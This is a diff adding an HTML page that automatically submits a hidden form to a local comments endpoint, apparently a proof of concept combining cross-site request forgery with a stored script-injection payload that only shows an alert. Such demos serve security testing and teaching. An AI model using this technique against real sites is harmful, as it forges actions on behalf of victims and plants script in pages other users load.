@@ -1,0 +1,10 @@
+<!doctype html>
+<html>
+<body>
+    <form id="csrf" method="POST" action="http://localhost:5000/comments">
+        <input type="hidden" name="username" value="HackedUser">
+        <input type="hidden" name="comment" value="<script>alert('XSS or data theft')</script>">
+    </form>
+    <script>document.getElementById('csrf').submit();</script>
+</body>
+</html>
